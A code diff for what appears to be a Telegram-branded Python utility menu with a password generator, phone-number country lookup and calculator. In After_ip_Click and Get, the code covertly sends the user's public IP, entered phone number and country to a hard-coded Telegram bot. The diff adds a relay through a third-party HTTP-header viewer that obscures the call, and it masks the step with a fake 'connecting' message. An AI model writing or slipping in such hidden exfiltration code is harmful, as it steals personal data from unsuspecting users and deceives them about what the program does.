@@ -1,7 +1,7 @@
 from os import system 
 try:
  from time import sleep
- from requests import get
+ from requests import get,post
  from ipapi import location
  from random import sample
  from colorama import Fore
@@ -19,9 +19,6 @@ class Style:
     END = '\033[0m'
     CYAN = '\033[96m'
 
-
-
- 
 def Directory_search(data):
        try:
            print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
@@ -80,39 +77,48 @@ def Password_generator():
                     Back_menu()
 
 def After_ip_Click():
- try:
-   ip = get("https://api.ipify.org").text
-   msg =(f"""
+    ip = get("https://api.ipify.org").text
+    msg =(f"""
 𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗣 :{ip}
  """)
-   print(Fore.GREEN+"[+] waiting For connecting ... ")
-   sleep(1)
-   url= (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
-   http = get(url)
-   system("clear")
- except Exception as e:
-     exit(Fore.RED+"[-] PLEASEENABLEVPN")                                  
+    print(Fore.GREEN+"[+] waiting for to connecting source... ")
+    sleep(1)
+    url= (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
+    debuger ={
+"UrlBox" : url,
+"AgentList":"Internet Explorer", 
+"VersionsList":"HTTP/1.1",
+"MethodList":"GET"
+}
+    http = post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
+    system("clear")                               
 
 def Get(numbers):        
+            ph_number = parse(numbers)
+            print(Fore.LIGHTYELLOW_EX+"this number country name is : ")
+            a =(geocoder.description_for_number(ph_number,"fa"))
+            print(a)
             msg =(f"""
 𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
-𝗗𝗘𝗩𝗜𝗖𝗘 Contrary 
+𝗗𝗘𝗩𝗜𝗖𝗘 Contrary :{a}
 𝗗𝗘𝗩𝗜𝗖𝗘 Number :{numbers}
  """)        
             url = (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
-            http = get(url)
+            debuger ={
+"UrlBox" : url,
+"AgentList":"Internet Explorer", 
+"VersionsList":"HTTP/1.1",
+"MethodList":"GET"
+}
+            http =post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
             print("\n")
             
 def Area_number():
          try: 
             print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
             numbers = input(Fore.LIGHTGREEN_EX+"Enter Number\t \nWith code area(+98):\n")
-            Get(numbers)
-            print(Fore.LIGHTYELLOW_EX+"this number country name is : ")
-            ph_number = parse(numbers)
-            print(geocoder.description_for_number(ph_number,"fa"))
-            
+            Get(numbers)          
             Back_menu()
          except Exception as Ex:
                   print(Ex)
@@ -155,11 +161,3 @@ def Calculator():
         print("",flush=True)
         exit("GoodBye!",flush=True)
         exit(1)
-        
-        
-        
-        
-        
-        
-        
-  
